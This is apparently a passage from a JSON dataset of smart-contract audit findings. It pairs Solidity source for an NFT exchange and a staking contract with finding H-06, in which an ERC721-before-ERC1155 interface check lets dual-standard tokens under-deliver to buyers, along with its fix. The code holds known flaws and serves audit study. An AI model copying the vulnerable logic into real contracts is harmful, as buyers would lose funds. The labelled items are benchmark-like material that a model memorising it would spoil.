to be transferred\n   * @param execPrice execution price\n   */\n  function _takeOrders(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.OrderItem[] calldata takerItems,\n    uint256 execPrice\n  ) internal {\n    bytes32 makerOrderHash = _hash(makerOrder);\n    bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);\n    bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);\n    require(makerOrderValid && executionValid, 'order not verified');\n    _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers \n              for take orders specifying a higher order intent\n   * @dev Updates order nonce state, does asset transfers and emits events\n   * @param makerOrderHash maker order hash\n   * @param makerOrder the maker order\n   * @param takerItems nfts to be transferred\n   * @param isMakerSeller is the maker order a sell order\n   * @param execPrice execution price\n   */\n  function _execTakeOrders(\n    bytes32 makerOrderHash,\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.OrderItem[] calldata takerItems,\n    bool isMakerSeller,\n    uint256 execPrice\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    if (isMakerSeller) {\n      _transferNFTsAndFees(makerOrder.signer, msg.sender, takerItems, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, makerOrder.signer, msg.sender, makerOrder, execPrice);\n    } else {\n      _transferNFTsAndFees(msg.sender, makerOrder.signer, takerItems, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, msg.sender, makerOrder.signer, makerOrder, execPrice);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers \n              for simple take orders\n   * @dev Updates order nonce state, does asset transfers and emits events\n   * @param makerOrderHash maker order hash\n   * @param makerOrder the maker order\n   * @param isMakerSeller is the maker order a sell order\n   * @param execPrice execution price\n   */\n  function _execTakeOneOrder(\n    bytes32 makerOrderHash,\n    OrderTypes.MakerOrder calldata makerOrder,\n    bool isMakerSeller,\n    uint256 execPrice\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    if (isMakerSeller) {\n      _transferNFTsAndFees(makerOrder.signer, msg.sender, makerOrder.nfts, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, makerOrder.signer, msg.sender, makerOrder, execPrice);\n    } else {\n      _transferNFTsAndFees(msg.sender, makerOrder.signer, makerOrder.nfts, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, msg.sender, makerOrder.signer, makerOrder, execPrice);\n    }\n  }\n\n  function _emitTakerEvent(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    OrderTypes.MakerOrder calldata order,\n    uint256 amount\n  ) internal {\n    emit TakeOrderFulfilled(orderHash, seller, buyer, order.execParams[0], order.execParams[1], amount);\n  }\n\n  /**\n   * @notice Transfers NFTs and fees\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param nfts nfts to transfer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferNFTsAndFees(\n    address seller,\n    address buyer,\n    OrderTypes.OrderItem[] calldata nfts,\n    uint256 amount,\n    address currency\n  ) internal {\n    // transfer NFTs\n    _transferMultipleNFTs(seller, buyer, nfts);\n    // transfer fees\n    _transferFees(seller, buyer, amount, currency);\n  }\n\n  /**\n   * @notice Transfers multiple NFTs in a loop and ERC1155s in a batch\n   * @param from the from address\n   * @param to the to address\n   * @param nfts nfts to transfer\n   */\n  function _transferMultipleNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem[] calldata nfts\n  ) internal {\n    uint256 numNfts = nfts.length;\n    for (uint256 i = 0; i < numNfts; ) {\n      _transferNFTs(from, to, nfts[i]);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   * @notice Transfer NFTs\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n\n  /**\n   * @notice Transfer ERC721s\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   * @notice Transfer ERC1155s\n   * @dev uses the ERC1155 batchTransfer function for efficient transfers\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferERC1155s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numNfts = item.tokens.length;\n    uint256[] memory tokenIdsArr = new uint256[](numNfts);\n    uint256[] memory numTokensPerTokenIdArr = new uint256[](numNfts);\n    for (uint256 i = 0; i < numNfts; ) {\n      tokenIdsArr[i] = item.tokens[i].tokenId;\n      numTokensPerTokenIdArr[i] = item.tokens[i].numTokens;\n      unchecked {\n        ++i;\n      }\n    }\n    IERC1155(item.collection).safeBatchTransferFrom(from, to, tokenIdsArr, numTokensPerTokenIdArr, '0x0');\n  }\n\n  /**\n   * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is \n            the one that actually 'pays' the fees\n   * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferFees(\n    address seller,\n    address buyer,\n    uint256 amount,\n    address currency\n  ) internal {\n    // protocol fee\n    uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;\n    uint256 remainingAmount = amount - protocolFee;\n    // ETH\n    if (currency == address(0)) {\n      // transfer amount to seller\n      (bool sent, ) = seller.call{value: remainingAmount}('');\n      require(sent, 'failed to send ether to seller');\n    } else {\n      // transfer final amount (post-fees) to seller\n      IERC20(currency).safeTransferFrom(buyer, seller, remainingAmount);\n      // send fee to protocol\n      IERC20(currency).safeTransferFrom(buyer, address(this), protocolFee);\n    }\n  }\n\n  // =================================================== UTILS ==================================================================\n\n  /// @dev Gets current order price for orders that vary in price over time (dutch and reverse dutch auctions)\n  function _getCurrentPrice(OrderTypes.MakerOrder calldata order) internal view returns (uint256) {\n    (uint256 startPrice, uint256 endPrice) = (order.constraints[1], order.constraints[2]);\n    uint256 duration = order.constraints[4] - order.constraints[3];\n    uint256 priceDiff = startPrice > endPrice ? startPrice - endPrice : endPrice - startPrice;\n    if (priceDiff == 0 || duration == 0) {\n      return startPrice;\n    }\n    uint256 elapsedTime = block.timestamp - order.constraints[3];\n    uint256 PRECISION = 10**4; // precision for division; similar to bps\n    uint256 portionBps = elapsedTime > duration ? PRECISION : ((elapsedTime * PRECISION) / duration);\n    priceDiff = (priceDiff * portionBps) / PRECISION;\n    return startPrice > endPrice ? startPrice - priceDiff : startPrice + priceDiff;\n  }\n\n  /// @dev hashes the given order with the help of _nftsHash and _tokensHash\n  function _hash(OrderTypes.MakerOrder calldata order) internal pure returns (bytes32) {\n    // keccak256('Order(bool isSellOrder,address signer,uint256[] constraints,OrderItem[] nfts,address[] execParams,bytes extraParams)OrderItem(address collection,TokenInfo[] tokens)TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 ORDER_HASH = 0x7bcfb5a29031e6b8d34ca1a14dd0a1f5cb11b20f755bb2a31ee3c4b143477e4a;\n    return\n      keccak256(\n        abi.encode(\n          ORDER_HASH,\n          order.isSellOrder,\n          order.signer,\n          keccak256(abi.encodePacked(order.constraints)),\n          _nftsHash(order.nfts),\n          keccak256(abi.encodePacked(order.execParams)),\n          keccak256(order.extraParams)\n        )\n      );\n  }\n\n  function _nftsHash(OrderTypes.OrderItem[] calldata nfts) internal pure returns (bytes32) {\n    // keccak256('OrderItem(address collection,TokenInfo[] tokens)TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 ORDER_ITEM_HASH = 0xf73f37e9f570369ceaab59cef16249ae1c0ad1afd592d656afac0be6f63b87e0;\n    uint256 numNfts = nfts.length;\n    bytes32[] memory hashes = new bytes32[](numNfts);\n    for (uint256 i = 0; i < numNfts; ) {\n      bytes32 hash = keccak256(abi.encode(ORDER_ITEM_HASH, nfts[i].collection, _tokensHash(nfts[i].tokens)));\n      hashes[i] = hash;\n      unchecked {\n        ++i;\n      }\n    }\n    bytes32 nftsHash = keccak256(abi.encodePacked(hashes));\n    return nftsHash;\n  }\n\n  function _tokensHash(OrderTypes.TokenInfo[] calldata tokens) internal pure returns (bytes32) {\n    // keccak256('TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 TOKEN_INFO_HASH = 0x88f0bd19d14f8b5d22c0605a15d9fffc285ebc8c86fb21139456d305982906f1;\n    uint256 numTokens = tokens.length;\n    bytes32[] memory hashes = new bytes32[](numTokens);\n    for (uint256 i = 0; i < numTokens; ) {\n      bytes32 hash = keccak256(abi.encode(TOKEN_INFO_HASH, tokens[i].tokenId, tokens[i].numTokens));\n      hashes[i] = hash;\n      unchecked {\n        ++i;\n      }\n    }\n    bytes32 tokensHash = keccak256(abi.encodePacked(hashes));\n    return tokensHash;\n  }\n\n  // ====================================================== ADMIN FUNCTIONS ======================================================\n\n  /// @dev used for rescuing exchange fees paid to the contract in tokens\n  function rescueTokens(\n    address destination,\n    address currency,\n    uint256 amount\n  ) external onlyOwner {\n    IERC20(currency).safeTransfer(destination, amount);\n  }\n\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'failed');\n  }\n\n  /// @dev adds a new transaction currency to the exchange\n  function addCurrency(address _currency) external onlyOwner {\n    _currencies.add(_currency);\n  }\n\n  /// @dev adds a new complication to the exchange\n  function addComplication(address _complication) external onlyOwner {\n    _complications.add(_complication);\n  }\n\n  /// @dev removes a transaction currency from the exchange\n  function removeCurrency(address _currency) external onlyOwner {\n    _currencies.remove(_currency);\n  }\n\n  /// @dev removes a complication from the exchange\n  function removeComplication(address _complication) external onlyOwner {\n    _complications.remove(_complication);\n  }\n\n  /// @dev updates auto snipe executor\n  function updateMatchExecutor(address _matchExecutor) external onlyOwner {\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  /// @dev updates the gas units required for WETH transfers\n  function updateWethTranferGas(uint32 _wethTransferGasUnits) external onlyOwner {\n    WETH_TRANSFER_GAS_UNITS = _wethTransferGasUnits;\n    emit NewWethTransferGasUnits(_wethTransferGasUnits);\n  }\n\n  /// @dev updates exchange fees\n  function setProtocolFee(uint16 _protocolFeeBps) external onlyOwner {\n    PROTOCOL_FEE_BPS = _protocolFeeBps;\n    emit NewProtocolFee(_protocolFeeBps);\n  }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\nimport {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';\n\ncontract MockERC20 is ERC20 {\n  constructor() ERC20('MockERC20', 'MCK20') {\n    uint256 supply = 1_000_000 * (10**decimals());\n    _mint(msg.sender, supply);\n  }\n}\n\n\n",
        "CodeNames": [
            "InfinityExchange.sol",
            "MockERC20.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-06",
                "Location": [
                    "//solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n",
                    "//solidity\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n"
                ],
                "Type": " Some real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break  InfinityExchange::_transferNFTs ",
                "Description": "\nMany real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break InfinityExchange::_transferNFTs, i.e., transferring less tokens than expected.\n\nFor example, the asset token of The Sandbox Game(https://www.sandbox.game/en/), a Top20 ERC1155 token on Etherscan(https://etherscan.io/tokens-nft1155?sort=7d&order=desc), supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred ([token address(https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5) and implementation(https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L14)).\n\nAssuming there is a user tries to buy two tokens of Sandbox's ASSETs with the same token id, the actual transferring is carried by InfinityExchange::_transferNFTs which first checks ERC721 interface supports and then ERC1155.\n\nsolidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n\n\nThe code will go into _transferERC721s instead of _transferERC1155s, since the Sandbox's ASSETs also support ERC721 interface. Then,\n\nsolidity\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n\nSince the ERC721(item.collection).safeTransferFrom is treated as an ERC1155 transferring with one item ([reference(https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L833)), there is only one item actually gets traferred.\n\nThat means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.\n\nNote that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.\n\n\nCheck the return values of Sandbox's ASSETs(https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5)'s supportInterface, both supportInterface(0x80ac58cd) and supportInterface(0xd9b67a26) return true.\n\n",
                "Repair": "\nReorder the checks,e.g.,\n\nsolidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    }\n  }\n\nnneverlander (Infinity) confirmed and resolved(https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1162965894):\n  Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760.\n\nHardlyDifficult commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1179595297):\n  When an NFT supports both 721 & 1155 interfaces, the code prefers _transferERC721s however this ignores the order's numTokens. This may result in under filling NFTs for an order, at the same cost to the buyer. The warden's recommendation would address this concern. Or maybe _transferERC721s could require numTokens == 1, but that approach would be limiting for this scenario. Since the buyer gets a fraction of what they paid for and it impacts a top20 1155, this seems to be a High risk issue.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\nimport {IERC20, SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {Pausable} from '@openzeppelin/contracts/security/Pausable.sol';\nimport {ReentrancyGuard} from '@openzeppelin/contracts/security/ReentrancyGuard.sol';\nimport {IStaker, Duration, StakeLevel} from '../interfaces/IStaker.sol';\n\n/**\n * @title InfinityStaker\n * @author nneverlander. Twitter @nneverlander\n * @notice The staker contract that allows people to stake tokens and earn voting power to be used in curation and possibly other places\n */\ncontract InfinityStaker is IStaker, Ownable, Pausable, ReentrancyGuard {\n  using SafeERC20 for IERC20;\n  struct StakeAmount {\n    uint256 amount;\n    uint256 timestamp;\n  }\n\n  ///@dev Storage variable to keep track of the staker's staked duration and amounts\n  mapping(address => mapping(Duration => StakeAmount)) public userstakedAmounts;\n\n  address public INFINITY_TOKEN;\n  ///@dev Infinity treasury address - will be a EOA/multisig\n  address public INFINITY_TREASURY;\n\n  /**@dev Power levels to reach the specified stake thresholds. Users can reach these levels \n          either by staking the specified number of tokens for no duration or a less number of tokens but with higher durations.\n          See getUserStakePower() to see how users can reach these levels.\n  */\n  uint16 public BRONZE_STAKE_THRESHOLD = 1000;\n  uint16 public SILVER_STAKE_THRESHOLD = 5000;\n  uint16 public GOLD_STAKE_THRESHOLD = 10000;\n  uint16 public PLATINUM_STAKE_THRESHOLD = 20000;\n\n  ///@dev Penalties if staked tokens are rageQuit early. Example: If 100 tokens are staked for twelve months but rageQuit right away,\n  /// the user will get back 100/4 tokens.\n  uint16 public THREE_MONTH_PENALTY = 2;\n  uint16 public SIX_MONTH_PENALTY = 3;\n  uint16 public TWELVE_MONTH_PENALTY = 4;\n\n  event Staked(address indexed user, uint256 amount, Duration duration);\n  event DurationChanged(address indexed user, uint256 amount, Duration oldDuration, Duration newDuration);\n  event UnStaked(address indexed user, uint256 amount);\n  event RageQuit(address indexed user, uint256 totalToUser, uint256 penalty);\n\n  constructor(address _tokenAddress, address _infinityTreasury) {\n    INFINITY_TOKEN = _tokenAddress;\n    INFINITY_TREASURY = _infinityTreasury;\n  }\n\n  // Fallback\n  fallback() external payable {}\n\n  receive() external payable {}\n\n  // =================================================== USER FUNCTIONS =======================================================\n\n  /**\n   * @notice Stake tokens for a specified duration\n   * @dev Tokens are transferred from the user to this contract\n   * @param amount Amount of tokens to stake\n   * @param duration Duration of the stake\n   */\n  function stake(uint256 amount, Duration duration) external override nonReentrant whenNotPaused {\n    require(amount != 0, 'stake amount cant be 0');\n    require(IERC20(INFINITY_TOKEN).balanceOf(msg.sender) >= amount, 'insufficient balance to stake');\n    // update storage\n    userstakedAmounts[msg.sender][duration].amount += amount;\n    userstakedAmounts[msg.sender][duration].timestamp = block.timestamp;\n    // perform transfer\n    IERC20(INFINITY_TOKEN).safeTransferFrom(msg.sender, address(this), amount);\n    // emit event\n    emit Staked(msg.sender, amount, duration);\n  }\n\n  /**\n   * @notice Change duration of staked tokens\n   * @dev Duration can be changed from low to high but not from high to low. State updates are performed\n   * @param amount Amount of tokens to change duration\n   * @param oldDuration Old duration of the stake\n   * @param newDuration New duration of the stake\n   */\n  function changeDuration(\n    uint256 amount,\n    Duration oldDuration,\n    Duration newDuration\n  ) external override nonReentrant whenNotPaused {\n    require(amount != 0, 'amount cant be 0');\n    require(\n      userstakedAmounts[msg.sender][oldDuration].amount >= amount,\n      'insufficient staked amount to change duration'\n    );\n    require(newDuration > oldDuration, 'new duration must be greater than old duration');\n\n    // update storage\n    userstakedAmounts[msg.sender][oldDuration].amount -= amount;\n    userstakedAmounts[msg.sender][newDuration].amount += amount;\n    // update timestamp for new duration\n    userstakedAmounts[msg.sender][newDuration].timestamp = block.timestamp;\n    // only update old duration timestamp if old duration amount is 0\n    if (userstakedAmounts[msg.sender][oldDuration].amount == 0) {\n      userstakedAmounts[msg.sender][oldDuration].timestamp = 0;\n    }\n    // emit event\n    emit DurationChanged(msg.sender, amount, oldDuration, newDuration);\n  }\n\n  /**\n   * @notice Untake tokens\n   * @dev Storage updates are done for each stake level. See _updateUserStakedAmounts for more details\n   * @param amount Amount of tokens to unstake\n   */\n  function unstake(uint256 amount) external override nonReentrant whenNotPaused {\n    require(amount != 0, 'stake amount cant be 0');\n    uint256 noVesting = userstakedAmounts[msg.sender][Duration.NONE].amount;\n    uint256 vestedThreeMonths = getVestedAmount(msg.sender, Duration.THREE_MONTHS);\n    uint256 vestedsixMonths = getVestedAmount(msg.sender, Duration.SIX_MONTHS);\n    uint256 vestedTwelveMonths = getVestedAmount(msg.sender, Duration.TWELVE_MONTHS);\n    uint256 totalVested = noVesting + vestedThreeMonths + vestedsixMonths + vestedTwelveMonths;\n    require(totalVested >= amount, 'insufficient balance to unstake');\n\n    // update storage\n    _updateUserStakedAmounts(msg.sender, amount, noVesting, vestedThreeMonths, vestedsixMonths, vestedTwelveMonths);\n    // perform transfer\n    IERC20(INFINITY_TOKEN).safeTransfer(msg.sender, amount);\n    // emit event\n    emit UnStaked(msg.sender, amount);\n  }\n\n  /**\n   * @notice Ragequit tokens. Applies penalties for unvested tokens\n   */\n  function rageQuit() external override nonReentrant {\n    (uint256 totalToUser, uint256 penalty) = getRageQuitAmounts(msg.sender);\n    // update storage\n    _clearUserStakedAmounts(msg.sender);\n    // perform transfers\n    IERC20(INFINITY_TOKEN).safeTransfer(msg.sender, totalToUser);\n    IERC20(INFINITY_TOKEN).safeTransfer(INFINITY_TREASURY, penalty);\n    // emit event\n    emit RageQuit(msg.sender, totalToUser, penalty);\n  }\n\n  // ====================================================== VIEW FUNCTIONS ======================================================\n\n  /**\n   * @notice Get total staked tokens for a user for all durations\n   * @param user address of the user\n   * @return total amount of tokens staked by the user\n   */\n  function getUserTotalStaked(address user) public view override returns (uint256) {\n    return\n      userstakedAmounts[user][Duration.NONE].amount +\n      userstakedAmounts[user][Duration.THREE_MONTHS].amount +\n      userstakedAmounts[user][Duration.SIX_MONTHS].amount +\n      userstakedAmounts[user][Duration.TWELVE_MONTHS].amount;\n  }\n\n  /**\n   * @notice Get total vested tokens for a user for all durations\n   * @param user address of the user\n   * @return total amount of vested tokens for the user\n   */\n  function getUserTotalVested(address user) public view override returns (uint256) {\n    uint256 noVesting = getVestedAmount(user, Duration.NONE);\n    uint256 vestedThreeMonths = getVestedAmount(user, Duration.THREE_MONTHS);\n    uint256 vestedsixMonths = getVestedAmount(user, Duration.SIX_MONTHS);\n    uint256 vestedTwelveMonths = getVestedAmount(user, Duration.TWELVE_MONTHS);\n    return noVesting + vestedThreeMonths + vestedsixMonths + vestedTwelveMonths;\n  }\n\n  /**\n   * @notice Gets rageQuit amounts for a user after applying penalties\n   * @dev Penalty amounts are sent to Infinity treasury\n   * @param user address of the user\n   * @return Total amount to user and penalties\n   */\n  function getRageQuitAmounts(address user) public view override returns (uint256, uint256) {\n    uint256 noLock = userstakedAmounts[user][Duration.NONE].amount;\n    uint256 threeMonthLock = userstakedAmounts[user][Duration.THREE_MONTHS].amount;\n    uint256 sixMonthLock = userstakedAmounts[user][Duration.SIX_MONTHS].amount;\n    uint256 twelveMonthLock = userstakedAmounts[user][Duration.TWELVE_MONTHS].amount;\n\n    uint256 threeMonthVested = getVestedAmount(user, Duration.THREE_MONTHS);\n    uint256 sixMonthVested = getVestedAmount(user, Duration.SIX_MONTHS);\n    uint256 twelveMonthVested = getVestedAmount(user, Duration.TWELVE_MONTHS);\n\n    uint256 totalVested = noLock + threeMonthVested + sixMonthVested + twelveMonthVested;\n    uint256 totalStaked = noLock + threeMonthLock + sixMonthLock + twelveMonthLock;\n    require(totalStaked >= 0, 'nothing staked to rage quit');\n\n    uint256 totalToUser = totalVested +\n      ((threeMonthLock - threeMonthVested) / THREE_MONTH_PENALTY) +\n      ((sixMonthLock - sixMonthVested) / SIX_MONTH_PENALTY) +\n      ((twelveMonthLock - twelveMonthVested) / TWELVE_MONTH_PENALTY);\n\n    uint256 penalty = totalStaked - totalToUser;\n\n    return (totalToUser, penalty);\n  }\n\n  /**\n   * @notice Gets a user's stake level\n   * @param user address of the user\n   * @return StakeLevel\n   */\n  function getUserStakeLevel(address user) external view override returns (StakeLevel) {\n    uint256 totalPower = getUserStakePower(user);\n\n    if (totalPower <= BRONZE_STAKE_THRESHOLD) {\n      return StakeLevel.NONE;\n    } else if (totalPower > BRONZE_STAKE_THRESHOLD && totalPower <= SILVER_STAKE_THRESHOLD) {\n      return StakeLevel.BRONZE;\n    } else if (totalPower > SILVER_STAKE_THRESHOLD && totalPower <= GOLD_STAKE_THRESHOLD) {\n      return StakeLevel.SILVER;\n    } else if (totalPower > GOLD_STAKE_THRESHOLD && totalPower <= PLATINUM_STAKE_THRESHOLD) {\n      return StakeLevel.GOLD;\n    } else {\n      return StakeLevel.PLATINUM;\n    }\n  }\n\n  /**\n   * @notice Gets a user stake power. Used to determine voting power in curating collections and possibly other places\n   * @dev Tokens staked for higher duration apply a multiplier\n   * @param user address of the user\n   * @return user stake power\n   */\n  function getUserStakePower(address user) public view override returns (uint256) {\n    return\n      ((userstakedAmounts[user][Duration.NONE].amount * 1) +\n        (userstakedAmounts[user][Duration.THREE_MONTHS].amount * 2) +\n        (userstakedAmounts[user][Duration.SIX_MONTHS].amount * 3) +\n        (userstakedAmounts[user][Duration.TWELVE_MONTHS].amount * 4)) / (10**18);\n  }\n\n  /**\n   * @notice Returns staking info for a user's staked amounts for different durations\n   * @param user address of the user\n   * @return Staking amounts for different durations\n   */\n  function getStakingInfo(address user) external view returns (StakeAmount[] memory) {\n    StakeAmount[] memory stakingInfo = new StakeAmount[](4);\n    stakingInfo[0] = userstakedAmounts[user][Duration.NONE];\n    stakingInfo[1] = userstakedAmounts[user][Duration.THREE_MONTHS];\n    stakingInfo[2] = userstakedAmounts[user][Duration.SIX_MONTHS];\n    stakingInfo[3] = userstakedAmounts[user][Duration.TWELVE_MONTHS];\n    return stakingInfo;\n  }\n\n  /**\n   * @notice Returns vested amount for a user for a given duration\n   * @param user address of the user\n   * @param duration the duration\n   * @return Vested amount for the given duration\n   */\n  function getVestedAmount(address user, Duration duration) public view returns (uint256) {\n    uint256 amount = userstakedAmounts[user][duration].amount;\n    uint256 timestamp = userstakedAmounts[user][duration].timestamp;\n    // short circuit if no vesting for this duration\n    if (timestamp == 0) {\n      return 0;\n    }\n    uint256 durationInSeconds = _getDurationInSeconds(duration);\n    uint256 secondsSinceStake = block.timestamp - timestamp;\n\n    return secondsSinceStake >= durationInSeconds ? amount : 0;\n  }\n\n  // ====================================================== INTERNAL FUNCTIONS ================================================\n\n  function _getDurationInSeconds(Duration duration) internal pure returns (uint256) {\n    if (duration == Duration.THREE_MONTHS) {\n      return 90 days;\n    } else if (duration == Duration.SIX_MONTHS) {\n      return 180 days;\n    } else if (duration == Duration.TWELVE_MONTHS) {\n      return 360 days;\n    } else {\n      return 0 seconds;\n    }\n  }\n\n  /** @notice Update user staked amounts for different duration on unstake\n    * @dev A more elegant recursive function is possible but this is more gas efficient\n   */\n  function _updateUserStakedAmounts(\n    address user,\n    uint256 amount,\n    uint256 noVesting,\n    uint256 vestedThreeMonths,\n    uint256 vestedSixMonths,\n    uint256 vestedTwelveMonths\n  ) internal {\n    if (amount > noVesting) {\n      userstakedAmounts[user][Duration.NONE].amount = 0;\n      userstakedAmounts[user][Duration.NONE].timestamp = 0;\n      amount = amount - noVesting;\n      if (amount > vestedThreeMonths) {\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;\n        userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;\n        amount = amount - vestedThreeMonths;\n        if (amount > vestedSixMonths) {\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;\n          userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;\n          amount = amount - vestedSixMonths;\n          if (amount > vestedTwelveMonths) {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;\n          } else {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;\n          }\n        } else {\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;\n        }\n      } else {\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;\n      }\n    } else {\n      userstakedAmounts[user][Duration.NONE].amount -= amount;\n    }\n  }\n\n  /// @dev clears staking info for a user on rageQuit\n  function _clearUserStakedAmounts(address user) internal {\n    // clear amounts\n    userstakedAmounts[user][Duration.NONE].amount = 0;\n    userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;\n    userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;\n    userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;\n\n    // clear timestamps\n    userstakedAmounts[user][Duration.NONE].timestamp = 0;\n    userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;\n    userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;\n    userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;\n  }\n\n  // ====================================================== ADMIN FUNCTIONS ================================================\n\n  /// @dev Admin function to rescue any ETH accidentally sent to the contract\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'Failed to send Ether');\n  }\n\n  /// @dev Admin function to update stake level thresholds\n  function updateStakeLevelThreshold(StakeLevel stakeLevel, uint16 threshold) external onlyOwner {\n    if (stakeLevel == StakeLevel.BRONZE) {\n      BRONZE_STAKE_THRESHOLD = threshold;\n    } else if (stakeLevel == StakeLevel.SILVER) {\n      SILVER_STAKE_THRESHOLD = threshold;\n    } else if (stakeLevel == StakeLevel.GOLD) {\n      GOLD_STAKE_THRESHOLD = threshold;\n    } else if (stakeLevel == 